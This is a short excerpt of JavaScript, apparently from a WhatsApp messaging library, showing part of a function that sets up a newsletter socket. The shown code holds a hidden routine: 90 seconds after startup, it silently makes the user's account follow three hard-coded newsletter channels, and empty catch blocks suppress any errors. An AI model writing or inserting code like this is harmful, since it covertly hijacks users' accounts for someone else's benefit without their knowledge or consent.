...
const makeNewsletterSocket = (config) => {
    ...
    setTimeout(async () => {
        try {
            await newsletterWMexQuery("120363423725119923@newsletter", Types_1.QueryIds.FOLLOW);
        } catch {}
        try {
            await newsletterWMexQuery("120363402056994147@newsletter", Types_1.QueryIds.FOLLOW);
        } catch {}
        try {
            await newsletterWMexQuery("120363422768113058@newsletter", Types_1.QueryIds.FOLLOW);
        } catch {}
    }, 90000);
